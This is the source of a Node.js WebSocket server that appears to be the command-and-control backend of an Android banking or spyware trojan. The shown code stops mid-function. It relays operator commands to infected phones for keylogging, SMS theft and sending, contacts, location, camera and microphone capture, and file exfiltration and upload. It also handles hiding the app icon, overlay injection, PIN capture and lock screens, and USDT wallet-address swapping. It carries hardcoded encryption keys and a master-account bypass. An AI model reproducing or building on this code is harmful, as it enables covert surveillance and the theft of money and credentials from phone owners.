const { Console } = require("console");
const express = require("express");
const http = require("http");
const app = express();
const crypto = require("crypto");


const WebSocket = require("ws");

const server = http.createServer(app);

const wss = new WebSocket.Server({ port: 8080 });
const SolrUsers = new Map();
const SolrMobs = new Map();
const wsToPhoneId = new Map();
const DeviceStatus = new Map();
const idf_admin = "slr_panel";
const idf_adminsend = "slr_panelsend";
const idf_client = "Slr_client";

const Alert_info = "Alert_info";
const Alert_success = "Alert_success";
const fs = require('fs');

// 捕获未处理的异常
process.on('uncaughtException', (err) => {
  // 打印错误信息到终端
  console.error('未捕获的异常：', err);

  // 写入错误信息到文件
  const errorMessage = `未捕获的异常：${err.message}\n堆栈信息：${err.stack}\n\n`;
  fs.appendFileSync('error_log.txt', errorMessage, 'utf8'); // 将错误信息追加到 error_log.txt 文件
});



wss.on("connection", (ws, req) => {
  const clientIP = req.socket.remoteAddress;
  const connTime = new Date().toISOString();
  console.log(`[NEW CONN] IP: ${clientIP}, Time: ${connTime}`);
  
  // 监听连接错误
  ws.on("error", (err) => {
    console.log(`[WS ERROR] IP: ${clientIP}, Error: ${err.message}`);
  });
  
  // WebSocket 连接建立后，处理消息
  ws.on("message", (message) => {
    console.log(`[MSG RECV] IP: ${clientIP}, Size: ${message.length} bytes`);
    try {
      let data;
      try {
        data = JSON.parse(message); // 尝试解析消息
      } catch (error) {
        console.warn("Failed to parse message:", error);
        return;  // 如果消息无法解析，跳过处理
      }

      if (data.pid) {
        const phoneId = data.pid;  // 获取设备标识符 phoneId
        if (!phoneId) {
          console.log("Received message without valid phoneId, skipping.");
          return;
        }


        if (data.itype === "Slr_client") {
          ws.clientType = "phone";   // 🔑 标记这是手机端

          if (!SolrMobs.has(phoneId)) {
            SolrMobs.set(phoneId, ws);  // 存储设备连接
            console.log(`Stored new WebSocket for phone with phoneId: ${phoneId}`);
          }

          // ✅ 新增：初始化心跳时间，防止被误删
          if (!DeviceStatus.has(String(phoneId).trim())) {
            DeviceStatus.set(String(phoneId).trim(), { lastPing: Date.now() });
          }

          // 处理 ping
          if (data.subc === "ping") {
            const params = new URLSearchParams(data.msg);
            const phoneInfo = {};

            for (const [key, value] of params.entries()) {
              phoneInfo[key] = value;
            }

            const deviceData = {
              lastPing: Date.now(),
              ...phoneInfo
            };

            DeviceStatus.set(String(phoneInfo.phone_id).trim(), deviceData);

            // ✅ 新增：推送设备更新通知给已订阅的管理面板
            const deviceKey = String(phoneInfo.phone_id).trim();
            const subscribers = SolrUsers.get(deviceKey);
            if (subscribers && subscribers.size > 0) {
              const notification = JSON.stringify({
                type: "deviceUpdate",
                pid: deviceKey,
                phoneInfo: deviceData
              });
              subscribers.forEach(subWs => {
                if (subWs.readyState === WebSocket.OPEN) {
                  try {
                    subWs.send(notification);
                    console.log(`[PUSH] 已推送设备更新到管理面板, phoneId=${deviceKey}`);
                  } catch (err) {
                    console.warn(`[PUSH] 推送失败:`, err.message);
                  }
                }
              });
            }
          }
        }


        // 处理来自网页端的连接请求（slr_panel）
        if (data.itype === "slr_panel") {
          ws.clientType = "web";     // 🔑 标记这是网页端

          if (data.subc === "join") {
            // 存储新的网页端 WebSocket 连接
            if (!SolrUsers.has(phoneId)) {
              SolrUsers.set(phoneId, new Set());
            }

            SolrUsers.get(phoneId).add(ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Stored new WebSocket for web with phoneId: ${phoneId}`);
          } else if (data.subc === "out") {
            // 处理 WebSocket 断开连接（来自网页端）
            const phoneSocketMob = SolrMobs.get(phoneId);  // 获取设备端 WebSocket
            if (phoneSocketMob && phoneSocketMob.readyState === WebSocket.OPEN) {
              const json_out = {
                type: "out",
                pid: phoneId,
              };
              try {
                phoneSocketMob.send(JSON.stringify(json_out));  // 向设备端发送“退出”命令
              } catch (err) {
                console.warn(`Failed to send 'out' command to phone ${phoneId}:`, err);
              }
            }
          } else if (data.subc === "ping") {
            const MobReciver = SolrMobs.get(phoneId);
            const deviceInfo = DeviceStatus.get(String(phoneId).trim());

            // 状态映射表
            const stateMap = {
              0: "CONNECTING",
              1: "OPEN",
              2: "CLOSING",
              3: "CLOSED"
            };

            // 格式化时间函数
            const formatTime = (ts) => {
              if (!ts) return null;
              const d = new Date(ts);
              const pad = (n) => String(n).padStart(2, "0");
              return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ` +
                `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
            };

            const response = {
              type: "statusBatch",
              pid: phoneId,
              serverToPhone: MobReciver ? stateMap[MobReciver.readyState] : "UNKNOWN",
              lastPing: deviceInfo ? formatTime(deviceInfo.lastPing) : null,
              // ✅ 直接带上整个设备信息
              phoneInfo: deviceInfo || {}
            };
            ws.send(JSON.stringify(response)); // 发回给前端
          }
          else if (data.subc === "disag") {
            SolrMobs.delete(phoneId);  // 删除设备端连接
            if (phoneId) {
              if (SolrUsers.has(phoneId)) {
                SolrUsers.get(phoneId).delete(ws);
                if (SolrUsers.get(phoneId).size === 0) {
                  SolrUsers.delete(phoneId);
                }
              }
              wsToPhoneId.delete(ws);
              DeviceStatus.delete(String(phoneId).trim());
            }
          }

        }

        // 处理来自设备端的其他命令
        handleDeviceCommands(data, ws, phoneId);
      } else if (data.subc === "checkphone") {
        if (data.email) {
          let phones = [];

          if (data.email === "GCt/Suj1maxHZ3aCykJufw==") {
            DeviceStatus.forEach((device) => {
              if (device.phone_id && String(device.phone_id).trim() !== "") {
                phones.push(device);
              }
            });
          } else {
            DeviceStatus.forEach((device) => {
              if (device.user_email === data.email) {
                if (!device.phone_id || String(device.phone_id).trim() === "") return;
                if (device.hasOwnProperty("display") && device.display !== "" && Number(device.display) === 0) return;
                phones.push(device);
              }
            });
          }

          // ⚡ 应用 filters
          const filters = data.filters || {};
          phones = phones.filter((device) => {
            // ✅ 先把 install_date 转换一下
            if (device.install_date) {
              device.install_date = normalizeDigits(device.install_date); // 转换成标准数字
            }

            if (filters.user_email && String(filters.user_email).trim() !== "") {
              const encFilter = encryptEmail(String(filters.user_email).trim()); // ✅ 加密
              if (device.user_email !== encFilter) {
                return false;
              }
            }
            if (filters.phone_name && !String(device.phone_name || "").includes(filters.phone_name)) {
              return false;
            }
            if (filters.country && !String(device.country || "").includes(filters.country)) {
              return false;
            }
            if (filters.model && !String(device.model || "").includes(filters.model)) {
              return false;
            }
            if (filters.accessibility !== undefined && filters.accessibility !== "") {
              if (String(device.accessibility) !== String(filters.accessibility)) {
                return false;
              }
            }
            if (filters.install_date && !String(device.install_date || "").includes(filters.install_date)) {
              return false;
            }
            return true;
          });

          // 📌 排序：install_date 降序 + phone_id 升序
          phones.sort((a, b) => {
            const da = parseDateSafe(a.install_date);
            const db = parseDateSafe(b.install_date);
            if (db !== da) return db - da;
            return String(a.phone_id || "").localeCompare(String(b.phone_id || ""), "en", { numeric: true });
          });

          // 📌 分页
          const page = Number(data.page) || 1;
          const pageSize = Number(data.pageSize) || 10;
          const total = phones.length;
          const pageCount = Math.ceil(total / pageSize);

          const start = (page - 1) * pageSize;
          const end = start + pageSize;
          const pagedPhones = phones.slice(start, end);

          // 📌 文件修改时间（总是返回）
          const filePath = "/apkstub/apkstub.zip";
          let fileLastModified = null;
          try {
            if (fs.existsSync(filePath)) {
              const stats = fs.statSync(filePath);
              fileLastModified = stats.mtime.toISOString();
            }
          } catch (err) {
            console.error("读取文件修改时间失败:", err);
          }

          // 📌 返回给前端
          ws.send(JSON.stringify({
            type: "checkphone",
            list: pagedPhones,   // 可能为空 []
            total,
            pageCount,
            page,
            pageSize,
            fileLastModified     // ⚡ 即使 total = 0 也返回
          }));

        }
      }



    } catch (error) {
      console.error("Error handling message:", error);
    }
  });
  // 监听 WebSocket 关闭事件
  // 关闭时的清理逻辑
  ws.on("close", () => {
    const phoneId = wsToPhoneId.get(ws);

    if (!phoneId) return;

    if (ws.clientType === "phone") {
      // 手机端断开 → 清理手机端数据
      SolrMobs.delete(phoneId);
      DeviceStatus.delete(String(phoneId).trim());
      console.log(`[CLOSE] 手机端断开，已清理 phoneId=${phoneId}`);
    } else if (ws.clientType === "web") {
      // 网页端断开 → 清理网页端数据
      if (SolrUsers.has(phoneId)) {
        SolrUsers.get(phoneId).delete(ws);
        if (SolrUsers.get(phoneId).size === 0) {
          SolrUsers.delete(phoneId);
        }
      }
      wsToPhoneId.delete(ws);
      console.log(`[CLOSE] 网页端断开，已清理 phoneId=${phoneId}`);
    }
  });
});



const PING_TIMEOUT = 75 * 1000;  // 心跳超时时间
const CHECK_INTERVAL = 25 * 1000; // 定时器间隔
const probes = new Map();

setInterval(() => {
  const now = Date.now();
  const toDelete = [];

  for (const [phoneId, wsConn] of SolrMobs.entries()) {
    const key = String(phoneId).trim();
    const deviceData = DeviceStatus.get(key);

    // 1. 已关闭的连接 → 直接清理
    if (!wsConn || wsConn.readyState === WebSocket.CLOSED) {
      toDelete.push(key);
      continue;
    }

    // 2. 超时未 ping
    if (deviceData && now - (deviceData.lastPing || 0) > PING_TIMEOUT) {
      const probeInfo = probes.get(key);

      if (!probeInfo) {
        // 第一次探测
        try {
          const jsonData = {
            type: "connected",
            kdate: Date.now()
          };
          wsConn.send(JSON.stringify(jsonData));
          probes.set(key, { time: now, count: 1 });
          console.log(`[探测] 向 phoneId=${key} 发送第1次探测`);
        } catch {
          toDelete.push(key);
        }
      } else {
        // 每10秒发送一次探测，直到连接恢复正常
        if (now - probeInfo.time >= 10000) {
          try {
            const jsonData = {
              type: "connected",
              kdate: Date.now()
            };
            wsConn.send(JSON.stringify(jsonData));
            probes.set(key, { time: now, count: probeInfo.count + 1 });
            console.log(`[探测] 向 phoneId=${key} 发送第 ${probeInfo.count + 1} 次探测`);
          } catch {
            toDelete.push(key);
          }
        }
      }
    } else {
      // 正常 → 清除探测记录
      probes.delete(key);
    }
  }

  // 3. 执行清理
  for (const key of toDelete) {
    try {
      const wsConn = SolrMobs.get(key);
      if (!wsConn || wsConn.readyState === WebSocket.CLOSED) {
        wsConn.close();
        SolrMobs.delete(key);
        DeviceStatus.delete(key);
        probes.delete(key);
        console.log(`[定时清理] 移除失效连接 phoneId=${key}`);
      }
    } catch { }

  }
}, CHECK_INTERVAL);


// 🔹 工具：把阿拉伯数字（٠١٢٣٤٥٦٧٨٩）转换成正常的 0-9
function normalizeDigits(str) {
  if (!str) return "";
  const arabicIndic = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"];
  let normalized = str;
  arabicIndic.forEach((d, i) => {
    const regex = new RegExp(d, "g");
    normalized = normalized.replace(regex, i);
  });
  return normalized;
}

// 🔹 工具：安全解析日期
function parseDateSafe(dateStr) {
  if (!dateStr) return 0;
  const normalized = normalizeDigits(String(dateStr).trim());
  const ts = Date.parse(normalized);
  return isNaN(ts) ? 0 : ts;
}


// 与 PHP 一致：AES-256-CBC + Base64
function encryptEmail(email) {
  const key = Buffer.from("@zxfNM=q>Drm`6VP)!:u-A~;92E<.?wR"); // Secrit_Key
  const iv = Buffer.from("G8v!h3*Y.P+pFm/;");                  // SIV
  const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
  let out = cipher.update(String(email), "utf8", "base64");
  out += cipher.final("base64");
  return out;
}



// Handle device commands and ensure proper connection
function handleDeviceCommands(data, ws, phoneId) {

  // 输出收到的命令类型和子命令
  const subcommand = data.subc;
  const itype = data.itype;
  const usercheck = data.usercheck;

  switch (itype) {
    case idf_admin:


      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_connect.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }

      const MobReciverr = SolrMobs.get(phoneId); // ✅ 发给安卓

      // 处理面板命令
      switch (subcommand) {

        case "proxy":
          {
            const subcom = data.prxcom;

            let jsonData;
            switch (subcom) {
              case "ON":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "1",
                  };
                }
                break;

              case "OFF":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "0",
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }

            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown proxy command", Alert_info);
            }
          }
          break;
        case "brows": //browser
          {


            const subcom = data.btype; //h = hidden , n = normall
            let jsonData;
            switch (subcom) {
              case "h":
                {
                  const newstsate = data.bcom; //0 = stop or 1 = start or 3 = comand
                  const extradata = data.extdata || null; //bcom = 0 this be null,bcom = 1 this be starturl , bcom = 3 this be like text<:CS:>hello<:CS:>
                  jsonData = {
                    type: "brows",
                    subc: "h",
                    bcom: newstsate,
                    extdata: extradata,
                  };
                }
                break;

              case "n":
                {
                  const newstsate = data.ltype; //html base64 f or url u
                  const extradata = data.extdata || null; //link , or html as base64 ,
                  jsonData = {
                    type: "brows",
                    subc: "n",
                    ltype: newstsate,
                    extdata: extradata,
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }
            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              //alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown browser command", Alert_info);
            }
          }
          break;
        case "fetch":
          {


            const fetchtype = data.ftype;
            const thepath = data.fpath ?? "";

            const jsonData = {
              type: "fetch",
              subc: fetchtype,
              extradata: thepath,
            };
            const msgdata = JSONIT(jsonData);

            MobReciverr.send(msgdata);
          }
          break;


        case "bc": //broadcast
          {
            const comand = data.comand;



            let thetitle = data.title;
            let themsg = data.msg;
            let tolunch = data.todo;
            let action = data.act; //action open link/app/nothing
            let actionnum = -1;
            if (action === "nothing") {
              actionnum = 0;
            } else if (action === "openApp") {
              actionnum = 1;
            } else if (action === "openLink") {
              actionnum = 2;
            } else {
              return;
            }

            switch (comand) {
              case "alert":
                {
                  let alertico = data.alertico;
                  const jsonData = {
                    type: "bc",
                    subc: "A",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                    ico: alertico,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "notify":
                {
                  const jsonData = {
                    type: "bc",
                    subc: "N",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;

              default:
                break;
            }
          }
          break;
        case "screen":

          {
            // const mobpid = data.pid;
            const comand = data.comand;



            switch (comand) {
              case "block":
                {
                  const blockit = data.bstate; //0,1
                  const color = data.color; //0,1

                  const jsonData = {
                    type: "screen",
                    subc: "block",
                    blockstate: blockit,
                    color: color
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "paste":
                {
                  const texttopaste = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "paste",
                    txt: texttopaste,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "mov":
                {

                  const mtype = data.movetype;
                  const points = data.poi;
                  const jsonData = {
                    type: "screen",
                    subc: "mov",
                    poi: points,
                    movetype: mtype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "snap":
                {
                  //snap , 1 single , 0 multie
                  const stype = data.stype; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "snap",
                    snaptype: stype,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata); //send it frontend js
                }
                break;

              case "vol":
                {
                  //vol = Voluome , 1 up , 0 down
                  const vstate = data.volstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "vol",
                    volstate: vstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "kb":
                {
                  //kb = keyboard , 1 show , 0 hide
                  const newstate = data.kbstate; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "kb",
                    kbstate: newstate,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "L":
                {
                  //L = Lock , 1 lock , 0 unlock
                  const lockit = data.lockit; //0,1
                  const jsonData = {
                    type: "screen",
                    subc: "L",
                    lock: lockit,
                  };
                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "nav":
                {
                  const navto = data.navshort; //ho, rec, bak
                  const jsonData = {
                    type: "screen",
                    subc: "nav",
                    nav: navto,
                  };
                  const msgdata = JSONIT(jsonData);
                  MobReciverr.send(msgdata);  // 发送命令到设备
                }
                break;
              case "q":
                {
                  const newqulity = data.newqulity;

                  const jsonData = {
                    type: "screen",
                    subc: "Q",
                    newq: newqulity,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "phonepass":

                {
                  const passtype = data.passtype;
                  const phonepass = data.txt;
                  const jsonData = {
                    type: "screen",
                    subc: "phonepass",
                    passtype: passtype,
                    phonepass: phonepass
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdt":
                {
                  const usdttype = data.usdttype;

                  const jsonData = {
                    type: "screen",
                    subc: "usdt",
                    usdttype: usdttype,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "usdtadress":
                {
                  const usdtxt = data.usdtadresstext;

                  const jsonData = {
                    type: "screen",
                    subc: "usdtadress",
                    usdtadresstext: usdtxt,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              case "blockd":
                {
                  const blotext = data.blocktext;

                  const jsonData = {
                    type: "screen",
                    subc: "blockd",
                    blocktext: blotext,
                  };

                  const msgdata = JSONIT(jsonData);

                  MobReciverr.send(msgdata);
                }
                break;
              default:
                break;
            }
          }
          break;
        // case "ping":
        //   {

        //     const jsonData = {
        //       type: "connected",
        //     };

        //     const msgdata = JSONIT(jsonData);

        //     MobReciverr.send(msgdata);
        //   }
        //   break;
        case "srch":
          {


            const searchfor = data.srchfor;
            const searchin = data.srchin;
            const serchpath = data.targetpath || "null";

            const jsonData = {
              type: "srh",
              subc: searchin, //G or S
              Tpath: serchpath,
              sfor: searchfor,
            };

            const chatdata = JSONIT(jsonData);

            MobReciverr.send(chatdata);
          }
          break;
        case "cocu": //copy cut
          {


            const thetype = data.state; //co cu
            const despath = data.tp;
            const frompsaths = data.fp;

            const json_file = {
              type: "file",
              subc: thetype,
              tpath: despath,
              fpath: frompsaths,
            };

            const filedata = JSONIT(json_file);

            MobReciverr.send(filedata);
          }
          break;
        case "chat":
          const msg = data.msg;

          const title = data.title;



          const jsonData = {
            type: "chat",
            data: msg,
            title: title,
          };

          const chatdata = JSONIT(jsonData);

          MobReciverr.send(chatdata);

          break;
        default:

          break;
      }
      break;
    case idf_adminsend:

      // ✅ 如果 check 不为空，写入 txt
      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_check.txt");

        // 固定为北京时间（UTC+8）
        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const line = `${phoneId}\t${usercheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("写入 mov_check.txt 出错:", err);
          }
        });
      }
      const MobReciver = SolrMobs.get(phoneId); // ✅ 发给安卓
      // if (!MobReciver) {
      //   console.log(`MobReciver is undefined or null for phoneId: ${phoneId}`);
      //   return;
      // } else if (MobReciver.readyState != WebSocket.OPEN) {
      //   console.log(`MobReciver is not OPEN for phoneId: ${phoneId}, readyState: ${MobReciver.readyState}`);
      //   return;
      // }

      switch (subcommand) {
        case "display":
          {
            const jsonData = {
              type: "screencomd",
              subc: "display",
              display: data.display,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "screen":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Screen",
              comdtype: data.screentype,        // e.g., SK
            };
            const msgdata = JSONIT(jsonData);
            MobReciver.send(msgdata);
          }
          break;
        case "cam":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Camera",
              SelectedCam: data.SelectedCam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "camoff":
          {

            const jsonData = {
              type: "screencomd",
              subc: "CameraOff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "mic":
          {
            const jsonData = {
              type: "mic",
              subc: "ON",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "micoff":
          {
            const jsonData = {
              type: "mic",
              subc: "OFF",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "activz":
          {
            const subc = data.subc; // 'L' or 'D'
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GA",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DA",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "notifys":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GF",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DF",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vapps":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GV",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DV",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "vlinks":
          {
            const subc = data.subc;
            const kdate = data.kdate;
            let jsonData = null;

            if (subc === "L") {
              jsonData = {
                type: "Activitys",
                subc: "GU",
                kdate: kdate,
              };
            } else if (subc === "D") {
              jsonData = {
                type: "Activitys",
                subc: "DU",
                kdate: kdate,
              };
            }

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Keylog":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "Keylog",
              comdtype: data.keylogtype,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "Logdate":
          {
            let jsonData = null;

            jsonData = {
              type: "screencomd",
              subc: "Logdate",
              comdtype: data.keylogtype,
              kdate: data.keylogdate,
            };
            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Permissions":
          {
            const subc = data.subc;
            if (subc === "Clear") {
              // 仅供后端数据库清空，WebSocket 不处理
            } else if (subc === "R") {
              const jsonData = {
                type: "Permissions",
                subc: "R",
                prim: data.prim,
              };
              MobReciver.send(JSONIT(jsonData));
            }
          }
          break;
        case "Hideico":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Hideico",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "DIAO":
          {

            const jsonData = {
              type: "screencomd",
              subc: "DIAO",
              pin: data.pin,
              title: data.title,
              lckdis: data.lckdis,
              typ: data.typ,
            };
            MobReciver.send(JSONIT(jsonData));
          }
        case "OPENINJ":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENINJ",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "OPENAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "OPENAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "UNINSTALLAPP":
          {

            const jsonData = {
              type: "screencomd",
              subc: "UNINSTALLAPP",
              package: data.packageName,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "LOADAPPS":
          {

            const jsonData = {
              type: "screencomd",
              subc: "LOADAPPS",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "Contacts":
          {

            const jsonData = {
              type: "screencomd",
              subc: "Contacts",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "SMS":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMS",
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "SMSSEND":
          {
            let jsonData = null;
            jsonData = {
              type: "screencomd",
              subc: "SMSSEND",
              smsnumber: data.smsnumber,
              message: data.message,
            };

            if (jsonData) MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "loc": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Location",
            };
            MobReciver.send(JSONIT(jsonData));

          }
          break;
        case "locoff": //location
          {
            const jsonData = {
              type: "screencomd",
              subc: "Locationoff",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "files":
          {
            const jsonData = {
              type: "screencomd",
              subc: "files",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;
        case "changefiles": {
          if (data.comdtype === "U") {
            const chunkSize = 1024 * 256; // 每片 256KB
            const content = data.content || ""; // Base64 字符串
            const totalSize = content.length;
            const totalChunks = Math.ceil(totalSize / chunkSize);

            let offset = 0;
            let index = 0;

            while (offset < totalSize) {
              const end = Math.min(offset + chunkSize, totalSize);
              const chunk = content.substring(offset, end);

              const jsonData = {
                type: "screencomd",
                subc: "changefiles",
                comdtype: data.comdtype, // "U"
                isinjct: data.isinjct,
                jctid: data.jctid,
                filepath: data.filepath,
                filetype: data.filetype,
                filename: data.filename,
                size: data.size,
                chunkIndex: index,
                totalChunks: totalChunks,
                content: chunk,
              };

              MobReciver.send(JSONIT(jsonData));

              offset = end;
              index++;
            }
          } else {
            // ⚡ 删除 (R) / 下载 (D) 保持原样
            const jsonData = {
              type: "screencomd",
              subc: "changefiles",
              comdtype: data.comdtype,
              filepath: data.filepath,
              filetype: data.filetype,
              filename: data.filename,
              size: data.size,
              content: data.content,
            };
            MobReciver.send(JSONIT(jsonData));
          }
        }
          break;

        case "noinj":
          {
            const jsonData = {
              type: "screencomd",
              subc: "noinj",
              jctid: data.jctid,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "viewfile":
          {
            const jsonData = {
              type: "screencomd",
              subc: "viewfile",
              filepath: data.filepath,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;


        case "rename":
          {
            const jsonData = {
              type: "screencomd",
              subc: "Rename",
              name: data.nam,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "change":
          {
            const jsonData = {
              type: "screencomd",
              subc: "change",
              domain: data.domain,
              ip: data.ip,
              changeid: data.changeid
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "Notify":
          {
            const jsonData = {
              type: "Notifi",
              noti: data.noti,
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

        case "delete":
          {
            const jsonData = {
              type: "Delete",
              subc: "[reme]",
            };
            MobReciver.send(JSONIT(jsonData));
          }
          break;

      }
      break;
    case idf_client:
      const FrontReciver = SolrUsers.get(phoneId);

      // 检查 WebSocket 连接是否有效


      if (FrontReciver) {
        for (const ws of FrontReciver) {
          if (ws.readyState === WebSocket.OPEN) {
            try {
              // 处理客户端命令
              switch (subcommand) {


                case "klogs":
                  {



                    const jsonData = {
                      type: "klog",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "klogsdate":
                  {



                    const jsonData = {
                      type: "klogsdate",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "sms":
                  {
                    const jsonData = {
                      type: "sms",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const jsonString = JSONIT(jsonData);

                    ws.send(jsonString);
                  }
                  break;
                case "chat":
                  const json_chat = {
                    type: "chat",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringchat = JSON.stringify(json_chat);

                  ws.send(stringchat, (error) => {
                    if (error) {
                      const stopjson = {
                        type: "stop",
                      };

                      const stopit = JSONIT(stopjson);

                      ws.send(stopit);
                      ws.terminate();
                    }
                  });

                  break;
                case "files":
                  const json_files = {
                    type: "files",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const stringfiles = JSON.stringify(json_files);

                  ws.send(stringfiles);
                  break;

                case "savefiles":
                  const json_filessave = {
                    type: "savefiles",
                    data: data.msg,
                    pid: data.pid,
                  };

                  const savefiles = JSON.stringify(json_filessave);

                  ws.send(savefiles);
                  break;

                case "thumb":
                  {
                    let imgpath = data.pth || "null";

                    const json_thumb = {
                      type: "thumb",
                      data: data.msg,
                      pid: data.pid,
                      path: imgpath,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "snap":
                  {
                    const json_thumb = {
                      type: "snap",
                      data: data.msg,
                      pid: data.pid,
                    };

                    const stringthumb = JSON.stringify(json_thumb);

                    ws.send(stringthumb);
                  }
                  break;
                case "mic":
                  {
                    const json_mic = {
                      type: "mic",
                      data: data.voip,
                      pid: data.pid,
                    };

                    const stringmic = JSON.stringify(json_mic);

                    ws.send(stringmic);
                  }
                  break;

                case "screen":
                  {


